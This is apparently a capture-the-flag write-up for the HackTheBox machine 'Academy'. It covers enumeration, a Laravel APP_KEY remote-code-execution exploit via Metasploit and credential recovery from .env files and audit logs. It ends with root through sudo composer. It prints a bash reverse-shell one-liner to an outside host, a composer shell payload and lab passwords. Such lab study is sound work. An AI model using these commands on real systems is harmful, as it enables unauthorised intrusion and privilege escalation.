# Academy

export IP=10.10.10.215

## Solution

lets start with an nmap scan

```
cmd: nmap -sC -sV -oN nmap/initial $IP

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the nmap result some things are visible:
- 2 services (ssh and apache)
- A subdomain (http://academy.htb/)

Re-run nmap with subdomain added to /etc/hosts... same results <br>

visit the webpage <br>

Seems a page like HTB, register is possible and some things are interesting in the contents:
- Already halfway in the "cracking passwords with hashcat" module
- username: egre55 (which is the creator of the box but can also be an actual user)

Besides from that it does not allow to perform anything on the page/buttons. <br>


Lets do an all port nmap scan ... <br>

well, a sneaky port is open <br>

```
cmd: nmap -p- -A -sV -oN nmap/initial $IP

33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000

```

I could not get anything from it so i went ahead and checked the forum and there was an interesting nudge:

```
Check your post messages !
```

So i went ahead and launched burp and registered an acc again  ! <br>

```
uid=waza&password=waza&confirm=waza&roleid=0
```

Changed the role id for 1... 
```
uid=waza&password=waza&confirm=waza&roleid=1
```

After all this i realised that i didnt made a gobuster scan (yes, im dumb)... I realised because login in with the role modification did not changed anything so i assumed that maybe another login exists for the admins...
```
cmd: gobuster dir -u "http://academy.htb/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x .php,.html,.txt -o gobuster/dirs.log

/images (Status: 301)
/register.php (Status: 200)
/login.php (Status: 200)
/index.php (Status: 200)
/admin.php (Status: 200)
```

logging in in the /admin.php it presents this
```
Item 	Status
Complete initial set of modules (cry0l1t3 / mrb3n) 	done
Finalize website design 	done
Test all modules 	done
Prepare launch campaign 	done
Separate student and admin roles 	done
Fix issue with dev-staging-01.academy.htb 	pending
```

Another subdomain <b>dev-staging-01.academy.htb</b>!!, lets add to /etc/hosts <br>

accessing: <b> dev-staging-01.academy.htb</b> presents internal information of the machine' environment and some error logs (maybe from the application). <br>

From the env info we can see there
```
DB_USERNAME : homestead
DB_PASSWORD: secret
```

From the env and the logs we can see that the app is using the <b>laravel</b> framework and its APP_key is visible in the env information... 

```
APP_KEY: base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=

/var/www/html/htb-academy-dev-01/vendor/laravel/framework/ (log)
```

Searchsploit and metasploit (the same exploit) have an RCE exploit for laravel... dont know if the versions match but i'll try <br>

```
Metasploit options

app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
rhost academy.htb
vhost dev-staging-01.academy.htb
lhost tun0
```

run and get a shell (dirty one), just revshell with

```
bash -c "bash -i >& /dev/tcp/10.10.15.50/1414 0>&1"
```


Interesting things found by linpeas (as www-data)
```
/var/www/html/academy/.env:DB_PASSWORD=mySup3rP4s5w0rd!!
.....
from /var/www/html/academy/.env:
------
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
.....
LISTENING 127.0.0.53:53
/var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $password = 'SecREt01';
/var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $password = 'test1234';

/var/www/html/academy/config/database.php:            'username' => env('DB_USERNAME', 'forge'),
/var/www/html/academy/vendor/laravel/framework/src/Illuminate/Database/README.md:    'username'  => 'root',
```

The passwords and usernames were not working in mysql so i went ahead and tried for the users accounts starting from the one with the user flag (cry0l1t3):
```
FOUND

cry0l1t3:mySup3rP4s5w0rd!!

su cry0l1t3

cat ~/user.txt
FLAG: 90bbf73c94cfa5a958eb60ee328cfab1
```

Running the linpeas from this user we can see some things worth of inspection
```
-rw-r----- 1 root adm 2748 Sep 14 20:58 /var/log/apt/term.log.2.gz                                                                                                   
-rw-r----- 1 root adm 10682 Aug 12 02:18 /var/log/apt/term.log.3.gz
-rw-r----- 1 root adm 4726 Nov  5 12:55 /var/log/apt/term.log.1.gz
-rw-r----- 1 root adm 3512 Nov 14 15:07 /var/log/apt/term.log
-r--r----- 1 root adm 8388720 Sep  4 03:45 /var/log/audit/audit.log.2
-rw-r----- 1 root adm 86739 Nov 14 15:30 /var/log/audit/audit.log
-r--r----- 1 root adm 8388617 Aug 23 21:45 /var/log/audit/audit.log.3
-r--r----- 1 root adm 8388813 Nov  9 10:11 /var/log/audit/audit.log.1
-rw-r----- 1 root adm 759 Oct 21 09:46 /var/log/apache2/error.log.5.gz
-rw-r----- 1 root adm 336 Sep 11 00:00 /var/log/apache2/error.log.9.gz
-rw-r----- 1 root adm 412 Nov  9 10:11 /var/log/apache2/error.log.2.gz
-rw-r----- 1 root adm 6748 Aug  9 23:51 /var/log/apache2/access.log.7.gz
-rw-r----- 1 root adm 2472 Aug 11 01:06 /var/log/apache2/access.log.5.gz
-rw-r----- 1 root adm 112045031 Nov 14 15:30 /var/log/apache2/access.log
-rw-r----- 1 root adm 0 Aug  7 14:30 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 304254 Nov  5 12:56 /var/log/apache2/access.log.1
-rw-r----- 1 root adm 51568810 Nov 14 15:30 /var/log/apache2/error.log
-rw-r----- 1 root adm 2902 Aug 10 23:30 /var/log/apache2/access.log.6.gz
-rw-r----- 1 root adm 337 Sep  8 00:00 /var/log/apache2/error.log.12.gz
-rw-r----- 1 root adm 336 Sep  7 00:00 /var/log/apache2/error.log.13.gz
-rw-r----- 1 root adm 275 Oct 21 10:57 /var/log/apache2/error.log.4.gz
-rw-r----- 1 root adm 8042 Aug 12 21:55 /var/log/apache2/access.log.4.gz
-rw-r----- 1 root adm 5845 Nov 14 15:01 /var/log/apache2/error.log.1
-rw-r----- 1 root adm 366 Nov  5 14:19 /var/log/apache2/error.log.3.gz
-rw-r----- 1 root adm 2087 Aug 13 13:56 /var/log/apache2/access.log.3.gz
-rw-r----- 1 root adm 336 Sep 10 00:00 /var/log/apache2/error.log.10.gz
-rw-r----- 1 root adm 337 Sep 14 00:00 /var/log/apache2/error.log.6.gz
-rw-r----- 1 root adm 7665 Sep 14 22:59 /var/log/apache2/access.log.2.gz
-rw-r----- 1 root adm 335 Sep 12 00:00 /var/log/apache2/error.log.8.gz
-rw-r----- 1 root adm 338 Sep  9 00:00 /var/log/apache2/error.log.11.gz
-rw-r----- 1 root adm 644 Aug  8 22:35 /var/log/apache2/access.log.8.gz
-rw-r----- 1 root adm 335 Sep 13 00:00 /var/log/apache2/error.log.7.gz
-rw-r----- 1 root adm 334 Sep  6 00:00 /var/log/apache2/error.log.14.gz

[+] Checking Pkexec policy
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                              
                                                                                                                                                                     
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

/home/cry0l1t3/.gnupg/pubring.kbx                                                                                                                                    
/home/cry0l1t3/.gnupg/crls.d/DIR.txt
/home/cry0l1t3/.gnupg/trustdb.gpg
/home/cry0l1t3/snap/lxd/14804/.config/lxc/config.yml

/var/www/html/academy/database/factories/UserFactory.php:$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm                                                
/var/www/html/htb-academy-dev-01/database/factories/UserFactory.php:$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm
```

Couldn't privesc with pkexec (which indicated 99% privesc vector in linpeas)... <br>

So i went ahead and checked the logs.. <br>

First i didnt found anything so i went ahead and checked only the logs that belonged to the adm group (which the current user is also) <br>

```
cmd: find /var/log/ -group adm

/var/log/auth.log.3.gz
/var/log/dmesg.1.gz
/var/log/syslog.2.gz
/var/log/kern.log.3.gz
/var/log/syslog.6.gz
/var/log/syslog.1
/var/log/kern.log
/var/log/dmesg.0
/var/log/syslog
/var/log/dmesg.2.gz
/var/log/apt/term.log.2.gz
/var/log/apt/term.log.3.gz
/var/log/apt/term.log.1.gz
/var/log/apt/term.log
/var/log/audit
/var/log/audit/audit.log.2
/var/log/audit/audit.log
/var/log/audit/audit.log.3
/var/log/audit/audit.log.1
/var/log/syslog.4.gz
/var/log/syslog.7.gz
/var/log/auth.log.2.gz
/var/log/auth.log.1
find: ‘/var/log/private’: Permission denied
/var/log/syslog.3.gz
/var/log/auth.log
/var/log/syslog.5.gz
/var/log/kern.log.2.gz
/var/log/unattended-upgrades
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log.1.gz
/var/log/dmesg.3.gz
/var/log/mysql
/var/log/mysql/error.log
/var/log/mysql/error.log.4.gz
/var/log/mysql/error.log.1
/var/log/mysql/error.log.3.gz
/var/log/mysql/error.log.6.gz
/var/log/mysql/error.log.8.gz
/var/log/mysql/error.log.7.gz
/var/log/kern.log.4.gz
/var/log/cloud-init.log
/var/log/dmesg
/var/log/dmesg.4.gz
/var/log/auth.log.4.gz

```

Now need to trim this.... <br>
Not interesting files
```
Apache (web logs) 
kernel 
mysql 
unattended-upgrades
apt (package manager)
dmesg
syslogs (checked two files' content)
```

Final list
```
/var/log/audit/audit.log.2
/var/log/audit/audit.log
/var/log/audit/audit.log.3
/var/log/audit/audit.log.1
/var/log/auth.log.3.gz
/var/log/auth.log.4.gz
/var/log/auth.log.2.gz
/var/log/auth.log.1
/var/log/auth.log

can be achieved (almost perfectly) with: $(find /var/log/ -name "au*" -print 2>/dev/null)
```

in order to know for what to grep, i analyzed some of the files
```
started with: /var/log/audit/audit.log
```

In this file we can see the executed commands by all the users in the machine, being it the root, the cry0l1t3, the mrb3n... <br>

```
example: 

type=USER_AUTH msg=audit(1605366265.400:179): pid=57404 uid=1002 auid=1002 ses=2 msg='op=PAM:authentication grantors=? acct="mrb3n" exe="/usr/bin/su" hostname=academy addr=? terminal=pts/1 res=failed
```

So we need to find things that our user or other users did, we can filter for uid's

```
cmd| cat /etc/passwd | grep /bin/sh

mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
21y4d:x:1003:1003::/home/21y4d:/bin/sh
ch4p:x:1004:1004::/home/ch4p:/bin/sh
g0blin:x:1005:1005::/home/g0blin:/bin/sh

uids 1001-1005
```

Now we need to delimit the search to this ids and to commands that require password input
```
/usr/bin/su
/usr/bin/sudo
/usr/bin/ssh
```

being the final command
```
cmd: cat /var/log/audit/* | grep "uid=100[1-5]" | grep -E 'exe="/usr/bin/su"|exe="/usr/bin/sudo"|exe="/usr/bin/ssh"'
```

Since the final result gave 217 lines, lets make 2 dump files:
- the matched 
- the unmatched


```
UNMATCHED 

cmd: cat /var/log/audit/* | grep "uid=100[1-5]" | grep -v -E 'exe="/usr/bin/su"|exe="/usr/bin/sudo"|exe="/usr/bin/ssh"'
```

The files will be included in the git folder with the following names
```
dump1 : match
dump2 : unmatch
```

it is visible that the user cry0l1t3 changed user via su at certain moments (48 matches)
```
cat dump1 | grep "uid=1002" | grep -E 'exe="/usr/bin/su"'

DUMP1 match example

type=USER_AUTH msg=audit(1605366265.400:179): pid=57404 uid=1002 auid=1002 ses=2 msg='op=PAM:authentication grantors=? acct="mrb3n" exe="/usr/bin/su" hostname=academy addr=? terminal=pts/1 res=failed'
```

Now we take the highest and the smallest timming and try to find in the second dump something that is inbetween them. <br>
```
Command to give the timmings and ID's
cmd: grep -Po 'audit(\K.*:?(?=: ))'
```

Sort the file
```
cmd: sort dump > dump.sorted

lowest entry:  1597199304.778:85
highest entry: 1605372901.472:694
```

Now find entries between these two <br>

```
Dump2 bounds

lowest entry:  1597199290.086:83
highest entry: 1605373076.968:724
```

they almost match, lets check the lowest in the dump2 <br>
```
type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A
```

we can see that the type of command is <b>'sh'</b> and it has hexadecimal values in the <b>data</b> field <br>

Lets grep only logs with commands
```
cmd: cat dump2 | grep -E 'comm' 

type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
type=TTY msg=audit(1597199304.778:89): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm="sh" data=77686F616D690A
type=TTY msg=audit(1597199308.262:90): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm="sh" data=657869740A
type=TTY msg=audit(1597199317.622:93): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=2F62696E2F62617368202D690A
type=TTY msg=audit(1597199443.421:94): tty pid=2606 uid=1002 auid=0 ses=1 major=4 minor=1 comm="nano" data=1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
type=TTY msg=audit(1597199533.458:95): tty pid=2643 uid=1002 auid=0 ses=1 major=4 minor=1 comm="nano" data=1B5B421B5B411B5B411B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B427F1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
type=TTY msg=audit(1597199575.087:96): tty pid=2686 uid=1002 auid=0 ses=1 major=4 minor=1 comm="nano" data=3618790D
type=TTY msg=audit(1597199606.563:97): tty pid=2537 uid=1002 auid=0 ses=1 major=4 minor=1 comm="bash" data=63611B5B411B5B411B5B417F7F636174206175097C206772657020646174613D0D636174206175097C20637574202D663131202D642220220D1B5B411B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B431B5B436772657020646174613D207C200D1B5B41203E202F746D702F646174612E7478740D69640D6364202F746D700D6C730D6E616E6F2064090D636174206409207C207878092D72202D700D6D617F7F7F6E616E6F2064090D6361742064617409207C20787864202D7220700D1B5B411B5B442D0D636174202F7661722F6C6F672F61750974097F7F7F7F7F7F6409617564097C206772657020646174613D0D1B5B411B5B411B5B411B5B411B5B411B5B420D1B5B411B5B411B5B410D1B5B411B5B411B5B410D657869747F7F7F7F686973746F72790D657869740D
type=TTY msg=audit(1597199606.567:98): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=657869740A
type=TTY msg=audit(1597199610.163:107): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=2F62696E2F62617368202D690A
type=TTY msg=audit(1597199616.307:108): tty pid=2712 uid=1002 auid=0 ses=1 major=4 minor=1 comm="bash" data=6973746F72790D686973746F72790D657869740D
type=TTY msg=audit(1597199616.307:109): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=657869740A
```

we can see that the commands are
```
sh
su
nano
bash
```

lets decode all the data to check
```
RAW data:
-----------------------------------
7375206D7262336E0A
6D7262336E5F41634064336D79210A
77686F616D690A
657869740A
2F62696E2F62617368202D690A
1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
1B5B421B5B411B5B411B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B427F1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
3618790D
63611B5B411B5B411B5B417F7F636174206175097C206772657020646174613D0D636174206175097C20637574202D663131202D642220220D1B5B411B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B431B5B436772657020646174613D207C200D1B5B41203E202F746D702F646174612E7478740D69640D6364202F746D700D6C730D6E616E6F2064090D636174206409207C207878092D72202D700D6D617F7F7F6E616E6F2064090D6361742064617409207C20787864202D7220700D1B5B411B5B442D0D636174202F7661722F6C6F672F61750974097F7F7F7F7F7F6409617564097C206772657020646174613D0D1B5B411B5B411B5B411B5B411B5B411B5B420D1B5B411B5B411B5B410D1B5B411B5B411B5B410D657869747F7F7F7F686973746F72790D657869740D
657869740A
2F62696E2F62617368202D690A
6973746F72790D686973746F72790D657869740D
657869740A


###################################

DECODED data (some are bytes without printable char):
-----------------------------------
su mrb3n
mrb3n_Ac@d3my! <- PASSWORD
whoami
exit
/bin/bash -i
exithistory
exit
exit
/bin/bash -i
istory
history
exit
exit
```

Here we go, we got some creds!!!
```
mrb3n:mrb3n_Ac@d3my!

su mrb3n
Password: mrb3n_Ac@d3my!

whoami
mrb3n

crontab -l (no jobs)
sudo -l


User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```


Check gtfo bins...
```
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

And voila 
```
whoami 
root

cat ~/root.txt
FLAG: 9e8989a235e30a14ba88b8a404470640
```
